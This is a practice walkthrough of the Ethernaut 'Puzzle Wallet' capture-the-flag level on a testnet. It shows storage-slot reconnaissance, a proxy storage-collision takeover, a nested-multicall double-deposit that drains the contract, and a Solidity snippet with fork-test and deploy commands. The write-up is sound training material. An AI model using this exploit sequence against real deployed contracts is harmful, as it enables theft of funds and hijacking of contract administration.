# Puzzle Wallet — Practice Walkthrough

## Goal
Practice the full CTF workflow: setup → recon → exploit → test → deploy.

---

## Step 1 — Setup

Deploy an Ethernaut instance on **Sepolia** and get the instance address from the browser console (F12).

Instance used: `0x3D9BAbAABEBceCF0D3603CA02926d5CECCD3CDE7`

## Step 2 — Create files (copy from templates)

```bash
cp src/AttackTemplate.sol src/PuzzleWalletAttack.sol
cp script/Attack.s.sol script/PuzzleWallet.s.sol
cp test/AttackTest.t.sol test/PuzzleWallet.t.sol
```

Then create an interface file `src/IPuzzleWallet.sol` with the function signatures.

## Step 3 — Recon with cast

```bash
source .env
TARGET=0x3D9BAbAABEBceCF0D3603CA02926d5CECCD3CDE7

# Check balance
cast balance $TARGET --rpc-url $CTF_RPC_URL
# → 0.001 ETH

# Read storage slots
cast storage $TARGET 0 --rpc-url $CTF_RPC_URL   # slot 0 = pendingAdmin / owner
cast storage $TARGET 1 --rpc-url $CTF_RPC_URL   # slot 1 = admin / maxBalance
```

**Key finding:** Slot 0 and Slot 1 both hold the same address — storage collision between proxy and implementation.

## Step 4 — The Vulnerability

**Storage collision** between `PuzzleProxy` and `PuzzleWallet`:
- Proxy slot 0 = `pendingAdmin` ↔ Wallet slot 0 = `owner`
- Proxy slot 1 = `admin` ↔ Wallet slot 1 = `maxBalance`

Plus the **multicall nesting trick**: `multicall` only checks if `deposit` is called once per multicall, but you can nest a second `multicall` inside to call `deposit` again with the same `msg.value`.

## Step 5 — Attack Contract (`src/PuzzleWalletAttack.sol`)

The exploit in 5 steps:

1. `proposeNewAdmin(us)` → writes our address to slot 0 → we become `owner` in wallet context
2. `addToWhitelist(us)` → so we can call deposit/multicall/execute
3. `multicall([deposit, multicall([deposit])])` with 0.001 ETH → credits us 0.002 ETH (double-counted)
4. `execute(player, 0.002 ether, "")` → drains the contract to 0
5. `setMaxBalance(uint256(player))` → writes our address to slot 1 → we become `admin`

### The multicall nesting trick in detail:

```solidity
// Inner call: just deposit
bytes[] memory depositCall = new bytes[](1);
depositCall[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);

// Outer call: deposit + nested multicall(deposit)
bytes[] memory nestedMulticall = new bytes[](2);
nestedMulticall[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
nestedMulticall[1] = abi.encodeWithSelector(IPuzzleWallet.multicall.selector, depositCall);

IPuzzleWallet(target).multicall{value: 0.001 ether}(nestedMulticall);
```

## Step 6 — Test against forked chain

```bash
source .env
forge test -vvvv --fork-url $CTF_RPC_URL --match-path test/PuzzleWallet.t.sol
```

Result: **PASSED** — admin changed to our address.

## Step 7 — Deploy for real

```bash
source .env
forge script script/PuzzleWallet.s.sol --rpc-url $CTF_RPC_URL --broadcast --private-key $PRIVATE_KEY
```

## Step 8 — Verify

```bash
cast call $TARGET "admin()(address)" --rpc-url $CTF_RPC_URL
```

Then go back to Ethernaut and click "Submit Instance".

---

## Workflow Summary (for any challenge)

1. `cp` the 3 templates (attack, script, test)
2. Create interface file in `src/`
3. Recon with `cast` (balance, storage slots, state)
4. Write exploit in `src/XAttack.sol`
5. Wire up `test/X.t.sol` and `script/X.s.sol`
6. Test: `forge test -vvvv --fork-url $CTF_RPC_URL --match-path test/X.t.sol`
7. Deploy: `forge script script/X.s.sol --rpc-url $CTF_RPC_URL --broadcast --private-key $PRIVATE_KEY`
8. Verify: `cast call` to check win condition
